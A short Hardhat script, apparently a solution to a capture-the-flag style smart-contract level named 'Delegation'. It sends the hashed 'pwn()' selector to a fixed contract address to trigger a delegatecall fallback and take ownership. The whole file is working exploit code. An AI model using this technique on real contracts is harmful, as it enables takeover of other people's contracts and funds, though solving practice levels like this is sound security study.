import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const delegation = await ethers.getContractAt("Delegation", "0xE42e0652F0a9767d3a1683bcF22BEC8E12Dcb96d");

  const pwn = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()"));
  await signer.sendTransaction({ to: delegation.address, data: pwn });

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
